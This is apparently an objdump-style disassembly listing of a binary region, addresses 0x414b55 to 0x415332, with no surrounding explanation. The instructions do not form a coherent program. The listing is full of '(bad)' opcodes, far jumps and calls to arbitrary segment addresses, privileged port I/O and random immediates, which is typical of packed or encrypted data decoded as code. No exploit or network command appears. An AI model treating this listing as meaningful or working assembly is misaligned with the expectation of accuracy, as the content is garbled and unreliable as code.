  414b55:	push   0xcbabd8a7
  414b5a:	mov    ds:0x18369f84,al
  414b5f:	sbb    al,0xa2
  414b61:	and    BYTE PTR [edi+0x514ac69a],0x73
  414b68:	in     eax,dx
  414b69:	not    bl
  414b6b:	fstp   QWORD PTR [edx-0x8]
  414b6e:	popf   
  414b6f:	push   es
  414b70:	pop    ecx
  414b71:	les    esi,FWORD PTR fs:[ecx+0x60]
  414b75:	cmp    al,0xfc
  414b77:	mov    ebx,ebp
  414b79:	fbld   TBYTE PTR [ebx+0x5]
  414b7c:	cwde   
  414b7d:	scas   eax,DWORD PTR es:[edi]
  414b7e:	daa    
  414b7f:	jmp    0xadb3:0xc2228bcd
  414b86:	mov    cs,WORD PTR [esi-0x151ef955]
  414b8c:	sbb    ecx,DWORD PTR [edx]
  414b8e:	and    al,al
  414b90:	sub    bh,BYTE PTR [ebx-0x79b0eb78]
  414b96:	adc    eax,0x99d1bf15
  414b9b:	jl     0x414b85
  414b9d:	jo     0x414bed
  414b9f:	xchg   DWORD PTR [edx+eax*8+0x48],esi
  414ba3:	pusha  
  414ba4:	and    al,0x5
  414ba6:	inc    esi
  414ba7:	mov    bl,bh
  414ba9:	jnp    0x414bdb
  414bab:	(bad)  
  414bac:	jle    0x414c24
  414bae:	dec    esp
  414baf:	xor    ebp,0xa2bd572c
  414bb5:	inc    edi
  414bb6:	push   eax
  414bb7:	or     al,0xc8
  414bb9:	es sahf 
  414bbb:	xchg   esp,eax
  414bbc:	sub    edx,esi
  414bbe:	add    BYTE PTR [ebx+0x1],dl
  414bc1:	dec    edx
  414bc2:	pop    es
  414bc3:	ins    BYTE PTR es:[edi],dx
  414bc4:	inc    ebp
  414bc5:	jae    0x414b68
  414bc7:	sbb    ebx,esi
  414bc9:	inc    esi
  414bca:	mov    ch,0x75
  414bcc:	fadd   st(6),st
  414bce:	push   eax
  414bcf:	sbb    BYTE PTR cs:[ebx-0x72a818ab],cl
  414bd6:	imul   esi,esi,0x4f717673
  414bdc:	mov    bp,0xd13d
  414be0:	(bad)  
  414be1:	les    eax,FWORD PTR [eax]
  414be3:	and    eax,0xc121c83e
  414be8:	das    
  414be9:	scas   al,BYTE PTR es:[edi]
  414bea:	test   DWORD PTR [ebx],ecx
  414bec:	jmp    0xe482a84c
  414bf1:	dec    ebp
  414bf2:	or     al,0x57
  414bf4:	scas   eax,DWORD PTR es:[edi]
  414bf5:	sar    DWORD PTR [esp+edx*2],cl
  414bf8:	popa   
  414bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bfa:	jecxz  0x414bf1
  414bfc:	jae    0x414bbe
  414bfe:	mov    ebx,DWORD PTR [eax+0x29f9fcd6]
  414c04:	or     ebx,esi
  414c06:	add    edi,eax
  414c08:	jl     0x414c3b
  414c0a:	test   DWORD PTR [edi+ebp*1+0x5ff31c2b],esp
  414c11:	popa   
  414c12:	inc    esi
  414c13:	inc    ebx
  414c14:	sbb    al,0x33
  414c16:	pop    ebp
  414c17:	scas   al,BYTE PTR es:[edi]
  414c18:	js     0x414c13
  414c1a:	jp     0x414c61
  414c1c:	add    al,0x6d
  414c1e:	cmp    al,0x57
  414c20:	or     BYTE PTR [ebx+0x794371d6],dh
  414c26:	sbb    dl,dl
  414c28:	mov    ah,0x89
  414c2a:	ror    cl,cl
  414c2c:	dec    ebp
  414c2d:	mov    edi,0x48c9a7a4
  414c32:	out    dx,eax
  414c33:	int    0x84
  414c35:	imul   edi,DWORD PTR [edx-0x628a6d71],0x7d66e52
  414c3f:	cmp    BYTE PTR [edx],0xd5
  414c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c43:	std    
  414c44:	inc    edi
  414c45:	xor    ebp,DWORD PTR [esi]
  414c47:	repnz mov al,ds:0x2b1485c6
  414c4d:	jns    0x414c1d
  414c4f:	adc    BYTE PTR [ebp-0x58],bh
  414c52:	xchg   edx,eax
  414c53:	lds    edi,FWORD PTR [ecx+0x2f8776cb]
  414c59:	push   ds
  414c5a:	mov    ebp,esp
  414c5c:	lahf   
  414c5d:	into   
  414c5e:	ret    0x1bec
  414c61:	jmp    0xdb4b:0xa7550a3b
  414c68:	cmovnp esi,DWORD PTR [edi-0x3f963a78]
  414c6f:	(bad)  
  414c70:	mov    esp,0xc25d2560
  414c75:	cmp    al,BYTE PTR [edx+edx*2]
  414c78:	ins    DWORD PTR es:[edi],dx
  414c79:	mov    bh,0x5b
  414c7b:	or     al,0x56
  414c7d:	retf   0x668a
  414c80:	ins    BYTE PTR es:[edi],dx
  414c81:	mov    bh,dl
  414c83:	or     dl,cl
  414c85:	clc    
  414c86:	and    BYTE PTR [eax-0x7b688210],ah
  414c8c:	call   DWORD PTR [edi+eiz*8]
  414c8f:	int    0x9e
  414c91:	push   0xffffffd6
  414c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c94:	inc    edi
  414c95:	jbe    0x414d03
  414c97:	mov    bh,0x72
  414c99:	sub    ch,BYTE PTR [edx+0x39]
  414c9c:	ja     0x414c8c
  414c9e:	and    al,0xd0
  414ca0:	ja     0x414c3b
  414ca2:	bound  esi,QWORD PTR [edx+edi*4-0x2e387ce6]
  414ca9:	and    eax,DWORD PTR [ecx-0x46]
  414cac:	test   BYTE PTR [edi+0xe],al
  414caf:	cmp    eax,esi
  414cb1:	dec    edx
  414cb2:	inc    edx
  414cb3:	sbb    eax,0xefac8b02
  414cb8:	mov    ds:0x8b5b6a85,al
  414cbd:	lods   al,BYTE PTR ds:[esi]
  414cbe:	int    0x72
  414cc0:	hlt    
  414cc1:	or     dh,BYTE PTR [ebp+0x5b]
  414cc4:	push   edx
  414cc5:	adc    BYTE PTR [edi+ecx*8-0x59],bl
  414cc9:	cld    
  414cca:	mov    edx,0xac8f0a34
  414ccf:	mov    dl,BYTE PTR [esi+0xf]
  414cd2:	(bad)
  414cd5:	mov    esi,DWORD PTR [ebx-0x4e7b5c7]
  414cdb:	pop    edi
  414cdc:	jmp    0xc4aacec1
  414ce1:	jecxz  0x414d0b
  414ce3:	std    
  414ce4:	jecxz  0x414d10
  414ce6:	push   esi
  414ce7:	mov    al,0xfe
  414ce9:	adc    al,0x87
  414ceb:	mov    ah,0xfe
  414ced:	test   eax,0xa9af7f83
  414cf2:	and    BYTE PTR [ebp-0x51],bl
  414cf5:	adc    eax,0x87f2360a
  414cfa:	fst    QWORD PTR [esi]
  414cfc:	xlat   BYTE PTR ds:[ebx]
  414cfd:	lea    ebp,[ebp+0x53]
  414d00:	pop    edx
  414d01:	neg    DWORD PTR [ecx]
  414d03:	push   cs
  414d04:	adc    al,0x32
  414d06:	int    0xd5
  414d08:	push   0x38
  414d0a:	xor    eax,0x1a9902a9
  414d0f:	xor    ch,BYTE PTR [ebx-0x78]
  414d12:	add    DWORD PTR [eax-0x71],ebx
  414d15:	in     al,0xe2
  414d17:	rol    ebp,0x6
  414d1a:	in     eax,dx
  414d1b:	(bad)  
  414d1d:	aam    0xc9
  414d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d20:	popa   
  414d21:	fcom   DWORD PTR [eax]
  414d23:	inc    ebp
  414d24:	mov    al,0xeb
  414d26:	jp     0x414d45
  414d28:	dec    esi
  414d29:	sahf   
  414d2a:	mov    ch,0x79
  414d2c:	stc    
  414d2d:	inc    ebx
  414d2e:	fist   WORD PTR [ebp-0x69]
  414d31:	or     dh,BYTE PTR [edi+esi*2-0x45405e1d]
  414d38:	and    edi,DWORD PTR [ecx]
  414d3a:	push   ebx
  414d3b:	imul   edx,DWORD PTR [edx-0x2ab30094],0x23a2f202
  414d45:	adc    cl,BYTE PTR [eax+0x6b32958c]
  414d4b:	jnp    0x414cd8
  414d4d:	scas   eax,DWORD PTR es:[edi]
  414d4e:	sahf   
  414d4f:	cdq    
  414d50:	push   ebp
  414d51:	xor    eax,0x66ef60c7
  414d56:	stos   BYTE PTR es:[edi],al
  414d57:	test   al,0x7b
  414d59:	xor    BYTE PTR [ecx],al
  414d5b:	out    dx,al
  414d5c:	out    dx,al
  414d5d:	ret    0x30d4
  414d60:	test   eax,0x6e688a33
  414d65:	imul   eax,edi,0x4bfe9611
  414d6b:	push   0x489efd1c
  414d70:	mov    cl,BYTE PTR [ecx-0x3d95fbb]
  414d76:	cli    
  414d77:	xlat   BYTE PTR ds:[ebx]
  414d78:	push   0x16
  414d7a:	adc    dl,bh
  414d7c:	xchg   ecx,edi
  414d7e:	or     DWORD PTR [esi-0x35ae5d92],ebx
  414d84:	ret    0xa8bb
  414d87:	(bad)  
  414d88:	test   DWORD PTR [edx+0x40a780e5],0xb1b1042b
  414d92:	mov    edi,cs
  414d94:	cmc    
  414d95:	aam    0xd1
  414d97:	mov    ah,0x9b
  414d99:	push   cs
  414d9a:	sub    bl,BYTE PTR [eax-0x365590ef]
  414da0:	aam    0x8e
  414da2:	enter  0xa9a,0x42
  414da6:	sub    DWORD PTR [esi+0x7e4efee1],edi
  414dac:	shr    dh,0x5b
  414daf:	and    al,BYTE PTR [ecx]
  414db1:	xchg   edx,eax
  414db2:	inc    eax
  414db3:	scas   eax,DWORD PTR es:[edi]
  414db4:	loopne 0x414e25
  414db6:	sub    eax,0x583dbc40
  414dbb:	cli    
  414dbc:	outs   dx,DWORD PTR ds:[esi]
  414dbd:	daa    
  414dbe:	inc    ebp
  414dbf:	neg    ebp
  414dc1:	hlt    
  414dc2:	dec    ecx
  414dc3:	xchg   edx,eax
  414dc4:	pop    ds
  414dc5:	into   
  414dc6:	jp     0x414e23
  414dc8:	sub    eax,0xa9976130
  414dcd:	fcomp  DWORD PTR [ebx-0x8]
  414dd0:	jl     0x414e0c
  414dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dd3:	add    DWORD PTR [eax-0x71],edx
  414dd6:	sbb    ecx,DWORD PTR [ecx-0x74a0fab5]
  414ddc:	adc    BYTE PTR [eax+0x1f],dl
  414ddf:	ds dec ecx
  414de1:	std    
  414de2:	dec    eax
  414de3:	mov    esp,0x355218a0
  414de8:	mov    bl,0xdf
  414dea:	into   
  414deb:	pusha  
  414dec:	sbb    ecx,DWORD PTR [edi]
  414dee:	push   0xffffffa7
  414df0:	mov    ds:0x2249b2a2,eax
  414df5:	cmp    BYTE PTR [eax+0x35104a6c],ch
  414dfb:	mov    ebp,0xb7eb7cd9
  414e00:	mov    bh,0xf
  414e02:	or     DWORD PTR [esi],ebp
  414e04:	shl    BYTE PTR [ecx+edi*1+0x3186a27b],0x2c
  414e0c:	pop    esp
  414e0d:	inc    edi
  414e0e:	add    ah,BYTE PTR [ecx+0x34f8b9a0]
  414e14:	pop    ecx
  414e15:	sahf   
  414e16:	retf   
  414e17:	sub    al,0xcd
  414e19:	(bad)  
  414e1a:	cmp    DWORD PTR ds:0x10fa9d91,ecx
  414e20:	in     al,0xf7
  414e22:	push   eax
  414e23:	push   0xcf278383
  414e28:	mov    ebx,0x2cb247d1
  414e2d:	cmp    dh,BYTE PTR [edi-0xd]
  414e30:	jbe    0x414dd8
  414e32:	les    ebx,FWORD PTR [edx+ebx*1]
  414e35:	lods   eax,DWORD PTR ds:[esi]
  414e36:	je     0x414e9b
  414e38:	repz add esi,esi
  414e3b:	arpl   WORD PTR [eax-0x2df3766d],ax
  414e41:	pusha  
  414e42:	loop   0x414ec3
  414e44:	pop    es
  414e45:	in     al,0x82
  414e47:	jle    0x414e80
  414e49:	ror    ch,cl
  414e4b:	hlt    
  414e4c:	inc    edi
  414e4d:	mov    eax,ds:0x68280128
  414e52:	cdq    
  414e53:	addr16 adc ecx,eax
  414e56:	or     ebp,0x4a
  414e59:	push   ds
  414e5a:	adc    BYTE PTR [ebp+eax*2+0x28],cl
  414e5e:	repnz mov eax,ds:0x550e7112
  414e64:	ins    BYTE PTR es:[edi],dx
  414e65:	aad    0x1
  414e67:	test   eax,0x658a7223
  414e6c:	mov    ds:0x4695ec6,eax
  414e71:	fwait
  414e72:	inc    esp
  414e73:	(bad)  
  414e74:	mov    esi,0x3c88d4dd
  414e79:	adc    edx,ebp
  414e7b:	bound  ebp,QWORD PTR [ecx+0x42e4e396]
  414e81:	xor    DWORD PTR [edi+eiz*1+0x2d],0xffffff9e
  414e86:	mov    cl,BYTE PTR [eax+ebp*8-0x4f]
  414e8a:	mov    dh,0xf0
  414e8c:	bound  eax,QWORD PTR [ebp-0x42e1ce21]
  414e92:	shl    BYTE PTR ds:0xf00b4a6d,0xdd
  414e99:	add    BYTE PTR [edx+0x3b],ch
  414e9c:	stos   BYTE PTR es:[edi],al
  414e9d:	xchg   ebp,eax
  414e9e:	(bad)  
  414e9f:	cmp    DWORD PTR [esi+0x71],edi
  414ea2:	pop    esi
  414ea3:	call   0x78ee:0x958ead6c
  414eaa:	sbb    BYTE PTR [edi-0x15],dh
  414ead:	test   edx,eax
  414eaf:	jl     0x414f27
  414eb1:	xor    DWORD PTR ds:0x9be80067,ebp
  414eb7:	(bad)  
  414eb8:	jmp    0xf8bc:0x412077de
  414ebf:	addr16 cwde 
  414ec1:	mov    ebx,0xb0ba81a5
  414ec6:	pop    edx
  414ec7:	cli    
  414ec8:	mov    ch,BYTE PTR [eax]
  414eca:	or     ecx,eax
  414ecc:	call   0xce51:0x8780988d
  414ed3:	scas   eax,DWORD PTR es:[edi]
  414ed4:	repnz outs dx,BYTE PTR ds:[esi]
  414ed6:	mov    dl,0x8f
  414ed8:	mov    DWORD PTR [ecx+0x42],edx
  414edb:	xor    ebx,edi
  414edd:	mov    esp,0xbd65a32b
  414ee2:	push   ebx
  414ee3:	gs push cs
  414ee5:	inc    esi
  414ee6:	xchg   ebp,ecx
  414ee8:	inc    edi
  414ee9:	arpl   WORD PTR [esi+ecx*4],sp
  414eec:	sub    BYTE PTR [eax+0x3a],0x7f
  414ef0:	mov    al,cl
  414ef2:	push   eax
  414ef3:	inc    ebx
  414ef4:	fnstsw WORD PTR [edi-0x17663695]
  414efa:	fdivr  QWORD PTR [esi-0x102f3e03]
  414f00:	jbe    0x414f72
  414f02:	xchg   edi,eax
  414f03:	and    eax,0x6ba0db1f
  414f08:	dec    edx
  414f09:	sti    
  414f0a:	or     al,0x72
  414f0c:	hlt    
  414f0d:	lahf   
  414f0e:	(bad)  
  414f10:	je     0x414e95
  414f12:	fmul   st,st(0)
  414f14:	mov    bl,0x28
  414f16:	out    dx,eax
  414f17:	adc    DWORD PTR [ecx+ebp*2-0x57],edx
  414f1b:	sbb    BYTE PTR [ebx],0x55
  414f1e:	sti    
  414f1f:	jae    0x414f4a
  414f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f22:	lea    edx,[eax+0x61]
  414f25:	xchg   edx,eax
  414f26:	rcr    BYTE PTR [edx+0xda2794],0xf1
  414f2d:	scas   eax,DWORD PTR es:[edi]
  414f2e:	neg    BYTE PTR [edx-0x23]
  414f31:	jo     0x414ee6
  414f33:	inc    edi
  414f34:	mov    bl,0x8a
  414f36:	arpl   cx,si
  414f38:	push   edi
  414f39:	xchg   ebx,eax
  414f3a:	xor    eax,0xcb2bb0c7
  414f3f:	jle    0x414f19
  414f41:	cli    
  414f42:	sbb    BYTE PTR [esi+0x42],bl
  414f45:	and    eax,edx
  414f47:	das    
  414f48:	popf   
  414f49:	(bad)  
  414f4a:	sbb    DWORD PTR [edx],0x29
  414f4d:	cmc    
  414f4e:	add    al,0x29
  414f50:	shr    BYTE PTR [ecx+edi*1],1
  414f53:	xchg   esi,eax
  414f54:	mov    eax,0x4d38d540
  414f59:	jns    0x414f8e
  414f5b:	(bad)  
  414f5c:	sbb    esi,DWORD PTR [edx]
  414f5e:	in     al,dx
  414f5f:	(bad)  
  414f60:	fisub  DWORD PTR [ebp+eax*2+0x2a]
  414f64:	fstp   st(0)
  414f66:	pop    ebp
  414f67:	fisubr WORD PTR [esi-0x4]
  414f6a:	outs   dx,DWORD PTR ds:[esi]
  414f6b:	dec    eax
  414f6c:	sbb    ah,dl
  414f6e:	cwde   
  414f6f:	mov    eax,ds:0x1ac83c70
  414f74:	pop    ds
  414f75:	add    eax,0xa3a6b7fe
  414f7a:	mov    ds:0x7b20ea9c,al
  414f7f:	call   0xad6bc3b1
  414f84:	int    0x77
  414f86:	mov    al,ds:0xd84de96b
  414f8b:	pop    ss
  414f8c:	inc    ebp
  414f8d:	lock xor DWORD PTR [ecx+0x34],0xbb7ca174
  414f95:	dec    ebp
  414f96:	cmp    ah,bh
  414f98:	call   0xcff9732b
  414f9d:	xchg   edx,eax
  414f9e:	xchg   BYTE PTR [ebx+0x2],al
  414fa1:	test   al,0x74
  414fa3:	jle    0x414f34
  414fa5:	sbb    al,0x28
  414fa7:	aas    
  414fa8:	add    dh,BYTE PTR [edx+0x5]
  414fab:	mov    ds:0x539a1b03,al
  414fb0:	pusha  
  414fb1:	inc    esi
  414fb2:	arpl   WORD PTR [eax],bx
  414fb4:	test   DWORD PTR [edx],0xfeee031e
  414fba:	out    dx,al
  414fbb:	data16 sahf 
  414fbd:	pop    ss
  414fbe:	mov    bl,0x47
  414fc0:	mov    eax,0x79d1ab3f
  414fc5:	inc    ebx
  414fc6:	or     esp,DWORD PTR [esi-0x71]
  414fc9:	pusha  
  414fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fcb:	sbb    BYTE PTR [ecx],al
  414fcd:	call   0x411306f6
  414fd2:	fstp   TBYTE PTR [edi-0x2d]
  414fd5:	sub    ebx,DWORD PTR [edx+0x31e1bba5]
  414fdb:	dec    edx
  414fdc:	dec    ebp
  414fdd:	bswap  edi
  414fdf:	mov    al,bl
  414fe1:	or     DWORD PTR [esi*8-0x2ead36d5],0xffffff88
  414fe9:	lds    edx,FWORD PTR [esi-0x444d591e]
  414fef:	or     al,0x99
  414ff1:	jae    0x414f76
  414ff3:	adc    BYTE PTR [ebx-0x3f],ah
  414ff6:	mov    esi,0xa1b84493
  414ffb:	or     BYTE PTR [edi+0xc],dl
  414ffe:	and    cl,BYTE PTR [edx+0x4d]
  415001:	loop   0x414f8f
  415003:	or     ch,al
  415005:	xor    BYTE PTR [ebx],bl
  415007:	clc    
  415008:	adc    al,0x13
  41500a:	fdivp  st(5),st
  41500c:	xor    dh,dl
  41500e:	sub    esp,DWORD PTR [esi+0x70d7b56f]
  415014:	icebp  
  415015:	fucom  st(0)
  415017:	push   0xffffffec
  415019:	ficom  WORD PTR [esi]
  41501b:	or     BYTE PTR cs:0x1b17725b,0xc2
  415023:	mov    bl,0x4
  415025:	xor    cl,al
  415027:	xchg   edx,eax
  415028:	and    edi,eax
  41502a:	(bad)  
  41502b:	mov    WORD PTR [ebx],cs
  41502d:	cmp    dl,BYTE PTR [edi+esi*2]
  415030:	pop    ebx
  415031:	add    eax,0x9e36f849
  415036:	mov    eax,DWORD PTR [ecx+0x605cc2e5]
  41503c:	dec    eax
  41503d:	into   
  41503e:	adc    ah,ah
  415040:	imul   eax,ecx,0xac2abda6
  415046:	cmp    ebx,ebx
  415048:	call   0x7985ff58
  41504d:	jmp    0x3bb1:0x3c6a5144
  415054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415055:	xchg   ecx,eax
  415056:	xchg   ecx,eax
  415057:	arpl   WORD PTR [ecx+0x3d],sp
  41505a:	mov    ch,0xb6
  41505c:	test   BYTE PTR [edx+edi*4-0x6a],ah
  415060:	mov    esi,0xe9303e89
  415065:	bound  edi,QWORD PTR fs:[ecx]
  415068:	scas   al,BYTE PTR es:[edi]
  415069:	mov    bh,0x18
  41506b:	imul   esi,DWORD PTR [ecx-0x23],0x27
  41506f:	pop    edx
  415070:	enter  0xf81c,0xc
  415074:	pusha  
  415075:	push   cs
  415076:	stc    
  415077:	and    ecx,ecx
  415079:	inc    edi
  41507a:	retf   0x31f9
  41507d:	shl    DWORD PTR [eax+0x4344d4fd],1
  415083:	xchg   ecx,eax
  415084:	inc    DWORD PTR [ecx+eiz*1+0x57]
  415088:	arpl   WORD PTR [ebx+0x3ca8ad74],di
  41508e:	sbb    eax,0xf8e3e3df
  415093:	and    DWORD PTR [ebx],esp
  415095:	fstp   TBYTE PTR fs:[eax+ecx*2-0x7c1994f6]
  41509d:	mov    WORD PTR [edx-0x7e8aec49],gs
  4150a3:	inc    ecx
  4150a4:	call   0xcbbee043
  4150a9:	pushf  
  4150aa:	fldcw  WORD PTR [eax+esi*8-0x7ac82b09]
  4150b1:	jns    0x415049
  4150b3:	fadd   st(5),st
  4150b5:	rol    DWORD PTR [esi],1
  4150b7:	imul   edx,ebx,0x90f24072
  4150bd:	and    al,0xe
  4150bf:	mov    edx,0x512aa3f3
  4150c4:	mov    bl,0xcb
  4150c6:	sbb    bl,cl
  4150c8:	das    
  4150c9:	cmp    BYTE PTR [edi],dh
  4150cb:	fs pop ds
  4150cd:	call   0x3c75:0xe00b5e5c
  4150d4:	test   DWORD PTR [esi+0xef0ba69],ebp
  4150da:	fstp   TBYTE PTR cs:[ebp-0x6f]
  4150de:	ret    0xbf17
  4150e1:	in     al,0xdf
  4150e3:	cmp    al,0x64
  4150e5:	inc    esp
  4150e6:	mov    al,ds:0xff750cf5
  4150eb:	mov    bl,0xf0
  4150ed:	or     eax,0x8f4f1674
  4150f2:	jp     0x41513b
  4150f4:	scas   eax,DWORD PTR es:[edi]
  4150f5:	stc    
  4150f6:	sub    al,0xf4
  4150f8:	xlat   BYTE PTR cs:[ebx]
  4150fa:	jo     0x415099
  4150fc:	inc    eax
  4150fd:	ror    BYTE PTR [ebp-0x17],0x36
  415101:	lods   eax,DWORD PTR ds:[esi]
  415102:	shl    DWORD PTR [eax+0x20d12e06],cl
  415108:	dec    eax
  415109:	jb     0x4150d9
  41510b:	pusha  
  41510c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41510d:	lds    edi,FWORD PTR ds:0xc45d9cc0
  415113:	adc    ebx,esp
  415115:	into   
  415116:	push   ebp
  415117:	xor    esi,ecx
  415119:	daa    
  41511a:	repnz add DWORD PTR [eax+0x46],eax
  41511e:	test   BYTE PTR [ebp+0x62619532],0x57
  415125:	in     eax,dx
  415126:	cdq    
  415127:	inc    ecx
  415128:	sti    
  415129:	adc    DWORD PTR [edx-0x69],ecx
  41512c:	je     0x415156
  41512e:	cmp    esp,DWORD PTR [esp+esi*2]
  415131:	xlat   BYTE PTR ds:[ebx]
  415132:	cli    
  415133:	shl    BYTE PTR [edx-0x24],cl
  415136:	xlat   BYTE PTR ds:[ebx]
  415137:	lods   eax,DWORD PTR ds:[esi]
  415138:	dec    edx
  415139:	ret    0xa272
  41513c:	push   edi
  41513d:	jg     0x4150d5
  41513f:	(bad)  
  415140:	adc    BYTE PTR [edx-0x20],ch
  415143:	push   0xffffffe9
  415145:	call   0x383c684a
  41514a:	inc    edi
  41514b:	mov    BYTE PTR [edx+0x4c],dh
  41514e:	pop    ebp
  41514f:	or     BYTE PTR [eax],cl
  415151:	cmp    edx,DWORD PTR [eax]
  415153:	xchg   ebx,eax
  415154:	rcl    DWORD PTR [esi-0x7a300e73],0xe
  41515b:	push   edx
  41515c:	frstpm(287 only) 
  41515e:	mov    esp,DWORD PTR [ebp-0x26]
  415161:	call   0x5b73:0x9a7e4917
  415168:	(bad)  
  415169:	das    
  41516a:	jp     0x4151c8
  41516c:	js     0x4151af
  41516e:	xchg   edx,eax
  41516f:	aas    
  415170:	dec    edi
  415171:	xchg   esp,eax
  415172:	push   es
  415173:	add    eax,0xe0afdce5
  415178:	and    dh,BYTE PTR [ebx-0x6b]
  41517b:	sub    edi,DWORD PTR [esi]
  41517d:	and    DWORD PTR [eax+edi*8-0x6ef63b85],ebp
  415184:	dec    edx
  415185:	ins    BYTE PTR es:[edi],dx
  415186:	add    eax,DWORD PTR [edx]
  415188:	les    edx,FWORD PTR [eax+0x2b]
  41518b:	cmp    dl,bl
  41518d:	sub    ecx,DWORD PTR [eax-0x3fe8ad14]
  415193:	cld    
  415194:	mov    edi,0xb25d2528
  415199:	jge    0x415196
  41519b:	ins    BYTE PTR es:[edi],dx
  41519c:	mov    dh,0x15
  41519e:	sub    eax,ecx
  4151a0:	jge    0x415161
  4151a2:	(bad)  
  4151a3:	cmp    eax,0x9d3da58
  4151a8:	test   BYTE PTR [esi+ecx*4-0x6b3084a1],0x76
  4151b0:	fwait
  4151b1:	pop    edi
  4151b2:	add    ebp,ecx
  4151b4:	jl     0x41518c
  4151b6:	iret   
  4151b7:	cmp    bl,BYTE PTR [edx-0x2c]
  4151ba:	lds    esp,FWORD PTR [esi-0x6a09af08]
  4151c0:	scas   al,BYTE PTR es:[edi]
  4151c1:	adc    eax,0x577a113f
  4151c6:	gs cwde 
  4151c8:	push   cs
  4151c9:	pusha  
  4151ca:	inc    esp
  4151cb:	xchg   DWORD PTR [esi-0x30],ecx
  4151ce:	pop    esi
  4151cf:	sub    edi,DWORD PTR [ebp-0x11]
  4151d2:	outs   dx,DWORD PTR ds:[esi]
  4151d3:	in     al,0x0
  4151d5:	sbb    DWORD PTR [ebp+0xde69321],eax
  4151db:	sub    BYTE PTR [eax+0x11],cl
  4151de:	rol    BYTE PTR [eax+0x3f],cl
  4151e1:	fwait
  4151e2:	push   0x54956209
  4151e7:	dec    edi
  4151e8:	call   0x966d:0x6c6f3a8e
  4151ef:	pop    esp
  4151f0:	add    al,0xcd
  4151f2:	and    eax,0xc47a1950
  4151f7:	enter  0x4e23,0x4f
  4151fb:	jno    0x4151a2
  4151fd:	sub    dl,dh
  4151ff:	or     DWORD PTR [ebp+ebx*8+0x5b],edx
  415203:	and    eax,DWORD PTR [esi+0xa50ef7a]
  415209:	(bad)  
  41520a:	stos   DWORD PTR es:[edi],eax
  41520b:	fsub   st,st(7)
  41520d:	jns    0x41519c
  41520f:	ds jae 0x41528e
  415212:	in     al,dx
  415213:	imul   ebp,DWORD PTR [ecx+0xc3bf82c],0xe
  41521a:	pop    ds
  41521b:	cwde   
  41521c:	inc    edi
  41521d:	out    dx,al
  41521e:	mov    al,0x62
  415220:	ss int3 
  415222:	out    dx,al
  415223:	dec    ebp
  415224:	sbb    eax,0x3eee0b86
  415229:	sub    DWORD PTR [edx+0x3125708b],ebx
  41522f:	lds    eax,FWORD PTR [eax+0x5b73a977]
  415235:	jbe    0x4151fd
  415237:	(bad)  
  415238:	lock cld 
  41523a:	cmp    DWORD PTR [eax+eiz*8],ecx
  41523d:	sub    eax,edi
  41523f:	cmc    
  415240:	bound  esi,QWORD PTR [eax+0x50343abc]
  415246:	mov    al,ds:0x13ad478
  41524b:	mov    esp,0x6c25dd7d
  415250:	js     0x415260
  415252:	mov    dl,0xdf
  415254:	shl    bh,0xae
  415257:	in     al,dx
  415258:	(bad)  
  415259:	lods   eax,DWORD PTR ds:[esi]
  41525a:	bound  ebp,QWORD PTR [esi]
  41525c:	out    0x37,eax
  41525e:	(bad)  
  41525f:	push   ecx
  415260:	pop    esp
  415261:	dec    ebp
  415262:	(bad)  
  415263:	mov    ebp,0x739615cd
  415268:	xor    eax,0x641f9fbe
  41526d:	(bad)  
  41526e:	adc    eax,0x496b9b94
  415273:	fld    st(0)
  415275:	and    ecx,DWORD PTR [edi+0x3f]
  415278:	mov    bh,0x70
  41527a:	ds or  al,0x93
  41527d:	adc    ebp,DWORD PTR [edi-0x52]
  415280:	mov    al,0x18
  415282:	mov    ecx,0xdff904bc
  415287:	push   ss
  415288:	pop    esi
  415289:	(bad)  
  41528a:	sbb    al,0x1
  41528c:	jne    0x4152c7
  41528e:	cs push ebx
  415290:	outs   dx,BYTE PTR ds:[esi]
  415291:	mov    al,ds:0x92ab13c3
  415296:	xchg   DWORD PTR [ebx-0x3dc2f369],eax
  41529c:	xor    edi,DWORD PTR [edx-0x5b]
  41529f:	jne    0x4152c9
  4152a1:	jle    0x4152a8
  4152a3:	xor    BYTE PTR [ebx],dl
  4152a5:	mov    al,ds:0x9977de9c
  4152aa:	stos   DWORD PTR es:[edi],eax
  4152ab:	mov    gs,edx
  4152ad:	cmp    cl,cl
  4152af:	push   ss
  4152b0:	jmp    0xbc2e:0x98f8d0e0
  4152b7:	jo     0x415332
  4152b9:	loopne 0x4152bb
  4152bb:	cwde   
  4152bc:	leave  
  4152bd:	cmp    eax,0xd4e74fe4
  4152c2:	shr    DWORD PTR [edi+0x5b],1
  4152c5:	repnz pop edx
  4152c7:	ret    0x98e3
  4152ca:	cs mov ch,0x2
  4152cd:	add    al,0xa7
  4152cf:	pushf  
  4152d0:	pop    edi
  4152d1:	adc    eax,0x51923678
  4152d6:	call   0x1d30d84d
  4152db:	mov    gs,ebp
  4152dd:	push   0xffffffd7
  4152df:	and    edi,DWORD PTR [eax-0x5cb8e8f8]
  4152e5:	test   eax,0xedfdb60d
  4152ea:	sub    esp,DWORD PTR [ecx+0x71]
  4152ed:	add    al,0x2e
  4152ef:	inc    eax
  4152f0:	push   ds
  4152f1:	fimul  DWORD PTR [edi-0xd]
  4152f4:	mov    DWORD PTR [ecx-0x30],edx
  4152f7:	mov    al,BYTE PTR [eax-0x7b722452]
  4152fd:	sbb    esi,ebp
  4152ff:	push   ecx
  415300:	lea    ebx,[edx+ebx*1-0x4d]
  415304:	jmp    0x4152b8
  415306:	push   es
  415307:	dec    edx
  415308:	xchg   ebp,eax
  415309:	outs   dx,BYTE PTR ds:[esi]
  41530a:	sbb    ecx,DWORD PTR [edi+0x43]
  41530d:	ret    0x54d3
  415310:	mov    ecx,0x9311ecc4
  415315:	dec    eax
  415316:	adc    bl,ch
  415318:	cwde   
  415319:	and    eax,0x6ac8762a
  41531e:	test   al,0x5b
  415320:	mov    ah,0x75
  415322:	mov    DWORD PTR [edx-0x5eac4bd9],eax
  415328:	aas    
  415329:	test   DWORD PTR [edx-0x73],0x714747b7
  415330:	sti    
  415331:	nop
  415332:	aaa    
